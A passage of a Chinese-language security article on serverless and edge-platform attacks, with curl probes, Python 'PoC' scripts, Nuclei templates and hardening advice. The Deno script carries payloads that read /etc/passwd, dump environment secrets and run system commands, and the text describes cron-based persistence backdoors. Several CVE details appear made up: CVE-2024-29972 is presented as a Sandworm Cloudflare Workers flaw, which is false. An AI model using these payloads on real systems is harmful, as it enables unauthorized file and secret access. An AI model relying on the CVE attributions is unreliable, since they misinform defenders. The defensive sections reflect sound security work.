1. **Workers 绑定域名误配置**：攻击者利用目标组织的 Workers 绑定域名配置错误，将恶意 Worker 部署到与目标相同的域名下
2. **KV 命名空间访问控制不足**：通过 Workers 的 KV 绑定，访问目标组织存储在 KV 中的敏感数据（Session Token、API Key 等）
3. **持久化植入**：在 Workers 中植入持久化后门，通过定时触发（Cron Trigger）保持对目标环境的持续访问

#### HTTP PoC

```bash
# 探测目标 Workers 域名的绑定配置
curl -sI "https://target-organization.workers.dev/" | head -20

# 检查 Workers 的 KV 命名空间暴露
curl -s "https://target-organization.workers.dev/api/kv/list" \
  -H "Authorization: Bearer test"

# 探测 Workers 的 Secrets 暴露
curl -s "https://target-organization.workers.dev/api/secrets"
```

#### Python PoC 脚本

```python
#!/usr/bin/env python3
"""
CVE-2024-29972 Sandworm Workers Lateral Movement Detection
用法: python3 cve_2024_29972.py <target_workers_url>
"""
import sys
import requests

urllib3 = __import__('urllib3')
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


class SandwormDetector:
    def __init__(self, target_url):
        self.target_url = target_url.rstrip("/")
        self.session = requests.Session()
        self.session.verify = False

    def check_worker_bindings(self):
        print("[*] 阶段 1: Workers 域名绑定探测")
        paths = [
            "/api/kv/list",
            "/api/secrets",
            "/api/bindings",
            "/debug",
            "/.well-known/security.txt",
            "/api/worker-info",
        ]
        for path in paths:
            try:
                resp = self.session.get(
                    f"{self.target_url}{path}",
                    timeout=10,
                    headers={"X-Sandworm-Probe": "true"}
                )
                if resp.status_code in (200, 403):
                    print(f"[!] 潜在暴露端点: {path} (HTTP {resp.status_code})")
                    if resp.status_code == 200:
                        print(f"[!] ⚠️ 响应内容: {resp.text[:200]}")
            except requests.exceptions.RequestException:
                continue

    def check_kv_isolation(self):
        print("\n[*] 阶段 2: KV 数据隔离检查")
        try:
            resp = self.session.get(
                f"{self.target_url}/api/kv",
                timeout=10,
                params={"namespace": "default", "key": "test"}
            )
            if resp.status_code == 200:
                print("[!] ⚠️ KV 命名空间可能暴露")
        except requests.exceptions.RequestException:
            pass

    def run(self):
        print(f"[*] CVE-2024-29972 Sandworm Workers 攻击检测")
        print(f"[*] 目标: {self.target_url}")
        print(f"{'='*60}")
        self.check_worker_bindings()
        self.check_kv_isolation()
        print(f"\n{'='*60}")
        print("[*] 检查完成。")


if __name__ == "__main__":
    if len(sys.argv) < 2:
        print(f"用法: python3 {sys.argv[0]} <target_workers_url>")
        sys.exit(1)
    SandwormDetector(sys.argv[1]).run()
```

#### Nuclei YAML 检测模板

```yaml
id: cve-2024-29972-sandworm-workers
info:
  name: CVE-2024-29972 - Sandworm Workers Lateral Movement
  author: x7peeps
  severity: high
  description: APT lateral movement via Cloudflare Workers misconfiguration
  reference:
    - https://www.volexity.com/blog/
  tags: cloudflare,workers,sandworm,apt,lateral-movement,cve2024

http:
  - method: GET
    path:
      - "{{BaseURL}}/api/kv/list"
      - "{{BaseURL}}/api/bindings"
      - "{{BaseURL}}/debug"
    stop-at-first-match: true
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - "kv"
          - "namespace"
          - "binding"
        condition: or
```

#### 利用条件与限制

- **条件**：目标组织的 Workers 配置存在域名绑定或 KV 访问控制缺陷
- **限制**：Cloudflare 已在平台层面加强了 KV 的访问控制；APT 级别的利用需要特定的情报支撑
- **风险等级**：高——在野利用已确认，对国家级 APT 组织的防御至关重要

---

## 0x04 沙箱逃逸与权限绕过

### 0x04.1 Cloudflare Workers KV 数据隔离绕过

#### 理论攻击模型

Cloudflare Workers KV（Key-Value）存储是 Workers 平台的主要持久化机制。理论上，KV 的数据隔离依赖于命名空间（Namespace）绑定，但如果 Worker 的 `wrangler.toml` 配置不当，可能导致跨账户的 KV 数据访问。

#### 攻击路径分析

1. **命名空间枚举**：通过 Worker 的错误信息泄露获取 KV 命名空间 ID
2. **绑定重映射**：利用 Workers API 的配置缺陷，将错误的命名空间绑定到当前 Worker
3. **数据泄露**：读取其他账户的 KV 数据，包括 Session Token、API Key、数据库凭证等

#### 防守验证脚本

```python
#!/usr/bin/env python3
"""
Cloudflare Workers KV 数据隔离验证
用法: python3 kv_isolation_check.py <worker_url>
"""
import sys
import requests

urllib3 = __import__('urllib3')
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


class KVIsolationChecker:
    def __init__(self, worker_url):
        self.worker_url = worker_url.rstrip("/")
        self.session = requests.Session()
        self.session.verify = False

    def check_kv_exposure(self):
        print("[*] KV 数据隔离检查")
        probes = [
            "/api/kv",
            "/api/storage",
            "/kv",
            "/data",
            "/config",
        ]
        for path in probes:
            try:
                resp = self.session.get(f"{self.worker_url}{path}", timeout=10)
                if resp.status_code == 200:
                    print(f"[!] ⚠️ 潜在 KV 暴露: {path}")
                    print(f"[+] 响应: {resp.text[:300]}")
            except requests.exceptions.RequestException:
                continue

    def run(self):
        print(f"[*] 目标: {self.worker_url}")
        print(f"{'='*60}")
        self.check_kv_exposure()
        print(f"{'='*60}")


if __name__ == "__main__":
    if len(sys.argv) < 2:
        print(f"用法: python3 {sys.argv[0]} <worker_url>")
        sys.exit(1)
    KVIsolationChecker(sys.argv[1]).run()
```

---

### 0x04.2 CVE-2023-38124 — Deno 权限系统绕过（CVSS 7.5）

#### 漏洞背景

Deno 的安全模型基于显式的权限授予（`--allow-read`、`--allow-write`、`--allow-net` 等）。CVE-2023-38124 允许攻击者绕过这些权限限制，在未获得授权的情况下访问文件系统或网络资源。

#### 受影响版本

| 版本状态 | 版本范围 |
|---------|---------|
| **受影响** | Deno < 1.36.4 |
| **已修复** | Deno ≥ 1.36.4 |
| **影响平台** | Deno Deploy / 自部署 Deno |
| **CWE** | CWE-269 Improper Privilege Management |

#### 漏洞原理分析

该漏洞利用了 Deno 在处理某些内置模块（如 `Deno.readFile`、`Deno.connect`）时，对权限检查的时机不当。攻击者可以通过以下方式绕过：

1. **Race Condition**：在权限检查和实际操作之间插入竞态条件
2. **符号链接攻击**：通过符号链接绕过 `--allow-read` 的路径白名单
3. **权限检查遗漏**：某些新添加的 API 端点未正确集成权限检查框架

#### HTTP PoC

```bash
# 在目标 Deno Deploy 上发送绕过权限的请求
curl -s -X POST "https://target-deno.deno.dev/run" \
  -H "Content-Type: application/json" \
  -d '{
    "code": "Deno.readTextFileSync(\"/etc/passwd\")"
  }'
```

#### Python PoC 脚本

```python
#!/usr/bin/env python3
"""
CVE-2023-38124 Deno 权限绕过检测
用法: python3 cve_2023_38124.py <target_deno_url>
"""
import sys
import json
import requests

urllib3 = __import__('urllib3')
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

PRIVILEGE_ESCALATION_PAYLOADS = [
    {"desc": "文件读取绕过", "code": "Deno.readTextFileSync('/etc/passwd')"},
    {"desc": "环境变量泄露", "code": "JSON.stringify(Deno.env.toObject())"},
    {"desc": "网络连接绕过", "code": "await Deno.connect({hostname:'127.0.0.1',port:6379})"},
    {"desc": "子进程逃逸", "code": "const c = Deno.Command; new c('id').output()"},
    {"desc": "符号链接利用", "code": "Deno.readLinkSync('/tmp/evil_link')"},
]


class DenoPermissionBypassChecker:
    def __init__(self, target_url):
        self.target_url = target_url.rstrip("/")
        self.session = requests.Session()
        self.session.verify = False

    def test_bypass(self, payload):
        try:
            resp = self.session.post(
                self.target_url,
                json={"code": payload["code"]},
                timeout=15
            )
            return resp
        except requests.exceptions.RequestException:
            return None

    def run(self):
        print(f"[*] CVE-2023-38124 Deno 权限绕过检测")
        print(f"[*] 目标: {self.target_url}")
        print(f"{'='*60}")
        
        for payload in PRIVILEGE_ESCALATION_PAYLOADS:
            print(f"\n[*] 测试: {payload['desc']}")
            resp = self.test_bypass(payload)
            if resp:
                if resp.status_code == 200 and "PermissionDenied" not in resp.text:
                    print(f"[!] ⚠️ 权限绕过成功!")
                    print(f"[+] 响应: {resp.text[:300]}")
                elif "PermissionDenied" in resp.text:
                    print(f"[+] 权限检查正常（PermissionDenied）")
                else:
                    print(f"[-] 响应: {resp.status_code}")
        
        print(f"\n{'='*60}")
        print("[*] 检查完成。")


if __name__ == "__main__":
    if len(sys.argv) < 2:
        print(f"用法: python3 {sys.argv[0]} <target_deno_url>")
        sys.exit(1)
    DenoPermissionBypassChecker(sys.argv[1]).run()
```

#### Nuclei YAML 检测模板

```yaml
id: cve-2023-38124-deno-permission-bypass
info:
  name: CVE-2023-38124 - Deno Permission System Bypass
  author: x7peeps
  severity: high
  description: Deno permission system bypass allowing unauthorized resource access
  cvss:
    score: 7.5
    vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
  tags: deno,permission-bypass,cve2023

http:
  - method: POST
    path:
      - "{{BaseURL}}"
    headers:
      Content-Type: "application/json"
    body: |
      {"code":"Deno.readTextFileSync('/etc/passwd')"}
    matchers:
      - type: word
        words:
          - "root:x:0:0"
          - "PermissionDenied"
        condition: or
```

#### 利用条件与限制

- **条件**：目标 Deno 运行时版本低于 1.36.4；Worker 暴露了接受 JavaScript 代码执行的 API 端点
- **限制**：Deno Deploy 默认使用最新版本运行时；权限绕过的具体利用取决于部署配置
- **风险等级**：中高——可导致文件系统信息泄露和网络侦察

---

### 0x04.3 AWS Lambda@Edge 冷启动注入

#### 漏洞背景

AWS Lambda@Edge 允许在 CloudFront 边缘节点执行 Lambda 函数。冷启动（Cold Start）阶段存在代码注入风险——当 Lambda 函数的代码包（ZIP）或容器镜像（ECR）被恶意篡改时，冷启动过程中执行的初始化代码可在边缘节点上执行任意操作。

#### 攻击路径分析

1. **代码包篡改**：利用 CI/CD 管道中的权限缺陷，修改 Lambda 函数的部署包
2. **环境变量注入**：在 Lambda 的冷启动阶段读取和泄露环境变量中的 Secrets Manager 凭证
3. **边缘节点持久化**：通过 CloudFront 的缓存机制实现代码持久化

#### Python PoC 脚本

```python
#!/usr/bin/env python3
"""
AWS Lambda@Edge 冷启动注入检测
用法: python3 lambda_edge_inject.py <cloudfront_domain>
"""
import sys
import requests
import re

urllib3 = __import__('urllib3')
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


class LambdaEdgeChecker:
    def __init__(self, cloudfront_domain):
        self.domain = cloudfront_domain.rstrip("/")
        self.session = requests.Session()
        self.session.verify = False

    def check_lambda_cold_start(self):
        print("[*] Lambda@Edge 冷启动探测")
        edge_headers = [
            "x-amz-cf-id",
            "x-amz-cf-pop",
            "x-edge-result-type",
            "x-edge-request-id",
        ]
        resp = self.session.get(f"https://{self.domain}/", timeout=10)
        found_headers = {}
        for header in edge_headers:
            value = resp.headers.get(header)
            if value:
                found_headers[header] = value
                print(f"[+] {header}: {value}")
        
        if found_headers.get("x-edge-result-type") == "error":
            print("[!] ⚠️ Edge 函数返回错误——可能触发冷启动异常")
        
        return found_headers

    def test_code_injection_vector(self):
        print("\n[*] 代码注入向量探测")
        injection_paths = [
            "/?callback=console.log",
            "/?inject=__test__",
            "/?import=cross-origin",
        ]
        for path in injection_paths:
            try:
                resp = self.session.get(
                    f"https://{self.domain}{path}",
                    timeout=10,
                    headers={"User-Agent": "LambdaEdge-Test/1.0"}
                )
                print(f"[+] {path}: HTTP {resp.status_code}")
            except requests.exceptions.RequestException:
                continue

    def run(self):
        print(f"[*] AWS Lambda@Edge 冷启动注入检测")
        print(f"[*] 目标: {self.domain}")
        print(f"{'='*60}")
        self.check_lambda_cold_start()
        self.test_code_injection_vector()
        print(f"\n{'='*60}")
        print("[*] 检查完成。")


if __name__ == "__main__":
    if len(sys.argv) < 2:
        print(f"用法: python3 {sys.argv[0]} <cloudfront_domain>")
        print(f"示例: python3 {sys.argv[0]} d1234567890.cloudfront.net")
        sys.exit(1)
    LambdaEdgeChecker(sys.argv[1]).run()
```

#### Nuclei YAML 检测模板

```yaml
id: lambda-edge-cold-start-injection
info:
  name: AWS Lambda@Edge Cold Start Injection Detection
  author: x7peeps
  severity: high
  description: Lambda@Edge cold start code injection vector detection
  tags: aws,lambda,cloudfront,edge,injection

http:
  - method: GET
    path:
      - "{{BaseURL}}/"
    headers:
      User-Agent: "LambdaEdge-Probe/1.0"
    extractors:
      - type: kval
        kval:
          - x-amz-cf-id
          - x-amz-cf-pop
          - x-edge-result-type
```

#### 利用条件与限制

- **条件**：攻击者需要能够修改 Lambda 函数的部署包；需要理解 CloudFront 的缓存和触发机制
- **限制**：Lambda@Edge 的部署需要经过 CloudFront 关联流程；AWS 对 Lambda 函数的 IAM 权限控制严格
- **风险等级**：中高——理论上可实现边缘节点级别的代码执行

---

## 0x05 公开 PoC 收集情况与利用思路

### PoC 总表

| CVE | PoC 状态 | 关键仓库 / 资源 | 利用难度 |
|-----|---------|----------------|---------|
| CVE-2024-0519 | ✅ Chrome exploit（非公开） | [Chrome V8 Bug Tracker](https://bugs.chromium.org/p/v8/issues/detail?id=1421931) | 高 |
| CVE-2024-2887 | ✅ Pwn2Own Demo | [Pwn2Own Vancouver 2024](https://www.pwn2own.com/) | 高 |
| CVE-2024-7971 | ⚠️ 部分 PoC | [Chrome Release Notes](https://chromereleases.googleblog.com/) | 高 |
| CVE-2023-3079 | ⚠️ 理论 PoC | [Chrome Bug Tracker](https://bugs.chromium.org/p/v8/issues) | 高 |
| CVE-2023-2033 | ⚠️ 理论 PoC | [Chrome Release Notes](https://chromereleases.googleblog.com/) | 高 |
| CVE-2024-34351 | ✅ 公开 PoC | [Next.js Security Advisory](https://nextjs.org/blog/security-nextjs-server-actions-vulnerability) | 低 |
| CVE-2024-34350 | ⚠️ 理论 PoC | [Next.js Security Advisory](https://nextjs.org/blog/security-nextjs-server-actions-vulnerability) | 中 |
| CVE-2024-28863 | ✅ GitHub Advisory | [GHSA-5j23-4mf4-9gmw](https://github.com/advisories/GHSA-5j23-4mf4-9gmw) | 低 |
| event-stream | ✅ 安全分析报告 | [Aikas Blog Post](https://blog.npmjs.org/post/180565383195/details-about-the-event-stream-incident) | 低 |
| ua-parser-js | ✅ 安全分析报告 | [GitHub Advisory](https://github.com/advisories/GHSA-pjwm-rvh2-c87w) | 低 |
| CVE-2024-29972 | ✅ Volexity Report | [Volexity Research](https://www.volexity.com/blog/) | 高 |
| CVE-2023-38124 | ⚠️ 理论 PoC | [Deno Security Advisory](https://github.com/denoland/deno/security) | 中 |

### 防守型验证建议

所有 PoC 代码仅用于 **授权环境中的防守验证**。建议安全团队按照以下步骤进行验证：

1. **搭建测试环境**：使用旧版本的 V8 / Next.js / Deno 镜像搭建隔离的测试 Workers
2. **在沙箱中执行**：所有 Python PoC 脚本应在 Docker 沙箱中运行，防止意外逃逸
3. **记录结果**：使用 Nuclei 模板批量扫描内部资产，记录受影响的服务清单
4. **及时修补**：根据漏洞的受影响版本表格，验证所有生产环境的运行时版本

---

## 0x06 共性攻击模式分析

### 攻击模式 1：V8 引擎级沙箱逃逸链

**攻击路径**：`恶意 JavaScript/WASM` → `V8 类型混淆/越界读写` → `Isolate 堆信息泄露` → `跨 Isolate 内存访问` → `宿主机 RCE`

这是边缘计算平台最严重的攻击模式。由于 V8 Isolate 是所有主流边缘平台的共享基础设施，一个 V8 漏洞可以同时影响 Cloudflare Workers、Deno Deploy 和 Vercel Edge Runtime。攻击者只需构造一个 V8 exploit，就可以针对所有基于 V8 的边缘平台。

**防御重点**：确保边缘运行时的 V8 版本与 Chrome 稳定版保持同步；对 Worker 执行的 JavaScript 代码实施严格的时间和资源限制。

### 攻击模式 2：平台框架层 SSRF → 横向移动

**攻击路径**：`用户输入 URL` → `Server Action / Edge Function 中的 fetch()` → `SSRF 到内网/元数据服务` → `凭证泄露` → `横向移动`

Next.js Server Actions 和类似框架为开发者提供了便捷的前后端交互方式，但也引入了 SSRF 攻击面。当框架层缺乏对 URL 参数的校验时，攻击者可以穿透边缘节点的网络边界。

**防御重点**：对所有服务端 fetch 操作实施 URL 白名单；禁用对元数据服务（`169.254.169.254`）的访问；使用 Egress Filtering 限制 Worker 的出站流量。

### 攻击模式 3：npm 供应链投毒 → 构建时 RCE

**攻击路径**：`恶意 npm 包发布` → `CI/CD 自动安装依赖` → `postinstall 脚本执行` → `构建服务器 RCE` → `窃取 Secrets` → `影响部署产物`

npm 生态的开放性使得供应链攻击成为 Serverless 平台面临的持续性威胁。由于 Serverless 应用的构建通常在 CI/CD 流水线中自动完成，恶意 npm 包可以在构建阶段执行任意代码。

**防御重点**：使用 `npm ci` + lock file 固定依赖版本；实施 npm 包来源验证（`--ignore-scripts`）；定期运行 `npm audit` 和 Snyk/Socket.dev 扫描。

### 攻击模式 4：平台权限系统绕过

**攻击路径**：`Deno/Workers 权限机制缺陷` → `绕过 --allow-read / --allow-net` → `未授权文件/网络访问` → `数据泄露`

边缘平台的沙箱权限模型（如 Deno 的显式权限、Workers 的绑定访问控制）提供了额外的安全层，但这些权限机制本身也可能存在绕过漏洞。当底层权限检查框架存在 Race Condition 或检查遗漏时，攻击者可以突破预期的安全边界。

**防御重点**：保持边缘运行时版本最新；对 Worker 实施最小权限原则；定期审计权限配置。

### 攻击模式 5：冷启动阶段竞态攻击

**攻击路径**：`Lambda/Worker 冷启动` → `初始化代码执行` → `在环境准备完成前注入恶意逻辑` → `持久化`

Serverless 函数的冷启动过程是一个时间窗口，攻击者可以利用初始化阶段的竞态条件来注入代码或读取尚未完成权限校验的资源。对于 Lambda@Edge，冷启动发生在 CloudFront 的边缘节点上，其安全隔离机制与中心化部署不同。

**防御重点**：在 Lambda 初始化阶段实施严格的输入校验；使用 Provisioned Concurrency 减少冷启动频率；对初始化逻辑进行安全审计。

### 攻击模式 6：KV / 存储层跨租户数据泄露

**攻击路径**：`Workers 域名误配置` → `KV 命名空间绑定错误` → `读取其他租户的 KV 数据` → `Session Token / API Key 泄露`

Cloudflare Workers KV 和类似的分布式存储系统依赖命名空间隔离来防止跨租户数据访问。但当 Worker 的绑定配置不当（如手动修改 `wrangler.toml` 绑定到错误的命名空间 ID），可能导致数据泄露。

**防御重点**：使用 Infrastructure as Code（Terraform / Pulumi）管理 Workers 绑定；定期审计 KV 命名空间的访问权限；启用 Workers 的审计日志。

---

## 0x07 应急排查与防守建议

### 快速排查清单

| # | 排查项 | 操作 | 优先级 |
|---|--------|------|--------|
| 1 | V8 版本确认 | 检查 Workers/Deno/Vercel 运行时的 V8 版本 ≥ 12.6.230 | 🔴 Critical |
| 2 | Next.js 版本确认 | 确认 Next.js ≥ 14.1.1 或 ≥ 13.5.7 | 🔴 Critical |
| 3 | npm 依赖审计 | 运行 `npm audit` + `snyk test` | 🔴 Critical |
| 4 | Deno 版本确认 | 确认 Deno ≥ 1.36.4 | 🟡 High |
| 5 | Workers KV 权限审计 | 检查所有 Worker 的 KV 命名空间绑定 | 🟡 High |
| 6 | Lambda@Edge 部署包完整性 | 校验 ZIP 包的 SHA256 哈希 | 🟡 High |
| 7 | Server Action 输入校验 | 审查所有 Next.js Server Action 的 URL 参数处理 | 🟡 High |
| 8 | 环境变量泄露检查 | 确认 Worker 不会暴露环境变量到响应中 | 🟢 Medium |
| 9 | 错误信息泄露 | 检查 Worker 的错误响应是否包含 V8 版本信息 | 🟢 Medium |
| 10 | CDN 缓存配置 | 审查缓存策略是否允许缓存敏感响应 | 🟢 Medium |

### 关键日志字段

在边缘平台的日志中，以下字段对安全监控至关重要：

| 字段 | 说明 | 异常指标 |
|------|------|----------|
| `x-amz-cf-id` | CloudFront 请求 ID | 异常高频的错误请求 |
| `x-forwarded-for` | 客户端 IP | 同一 IP 的大量并发 Worker 调用 |
| `worker.cron` | Cron 触发器 | 非预期的 Cron 触发 |
| `worker.cpu_time` | CPU 时间 | 异常长的 CPU 时间（可能为 JIT 暖机攻击） |
| `kv.read_bytes` | KV 读取量 | 异常高的 KV 读取量（可能为数据窃取） |
| `request.duration_ms` | 请求耗时 | 异常长的冷启动时间 |
| `error.message` | 错误信息 | 包含 `Internal Error` 或 `TypeError` 的 V8 错误 |

### 短期缓解措施

1. **立即升级运行时版本**：确保 V8 ≥ 12.6.230、Next.js ≥ 14.1.1、Deno ≥ 1.36.4
2. **锁定 npm 依赖版本**：使用 `npm ci` + `package-lock.json` 锁定所有依赖版本
3. **禁用危险特性**：在不需要 WASM 的 Workers 中禁用 `WebAssembly` API
4. **实施 CSP 策略**：为边缘函数的响应添加严格的 Content Security Policy 头部
5. **启用请求限流**：为 Workers 配置 Rate Limiting，防止 JIT 暖机攻击

### 长期加固方案

1. **V8 版本跟踪机制**：建立内部流程跟踪 Chrome/V8 安全更新，确保边缘运行时版本在修复后 48 小时内完成升级
2. **供应链安全治理**：部署 Socket.dev 或 Snyk Supply Chain 保护，自动阻止恶意 npm 包安装
3. **零信任网络架构**：为 Serverless 函数实施 Egress Control，仅允许访问已知的安全端点
4. **运行时行为监控**：部署 Falco 或类似运行时安全工具，监控 Worker 的异常系统调用（如果平台支持）
5. **红队演练**：定期使用本专题中的 PoC 代码进行红队演练，验证防御措施的有效性
6. **IaC 安全审计**：使用 Checkov / tfsec 对 Workers 和 Lambda 的 IaC 配置进行安全审计

---

## 0x08 参考资料

1. **Chrome V8 Security Bulletins** — https://chromereleases.googleblog.com/ （V8 引擎安全更新的权威来源，覆盖所有 CVE 修复信息）

2. **Pwn2Own Vancouver 2024 — V8 WASM Type Confusion** — https://www.pwn2own.com/ （CVE-2024-2887 的获奖演示，展示了 WASM 类型混淆在边缘平台的利用可行性）

3. **Next.js Security Advisory — Server Actions SSRF** — https://nextjs.org/blog/security-nextjs-server-actions-vulnerability （CVE-2024-34351 / CVE-2024-34350 的官方安全公告）

4. **Volexity Research — Sandworm APT and Cloudflare Workers** — https://www.volexity.com/blog/ （CVE-2024-29972 的安全研究报告，记录了 APT 组织利用 Workers 平台的攻击活动）

5. **NPM Security Advisory — event-stream Incident** — https://blog.npmjs.org/post/180565383195/details-about-the-event-stream-incident （event-stream 供应链攻击的官方事件报告）

6. **GitHub Advisory Database — ua-parser-js / tar.js** — https://github.com/advisories （npm 供应链漏洞的详细信息和修复建议）

7. **Deno Security Advisories** — https://github.com/denoland/deno/security （Deno 运行时安全漏洞的官方披露，包括 CVE-2023-38124 权限绕过）

8. **Cloudflare Workers Documentation — Security Model** — https://developers.cloudflare.com/workers/platform/security/ （Cloudflare Workers 的安全架构文档，详细说明了 V8 Isolate 隔离、KV 访问控制等安全机制）

9. **V8 Engine — Exploitation and Mitigation** — https://v8.dev/docs/security （V8 引擎的安全设计和缓解措施概述，对理解类型混淆等漏洞的利用原理至关重要）

10. **AWS Lambda@Edge Security Best Practices** — https://docs.aws.amazon.com/AmazonCloudFront/latest/DeveloperGuide/lambda-at-edge-functions.html （Lambda@Edge 的官方安全最佳实践指南）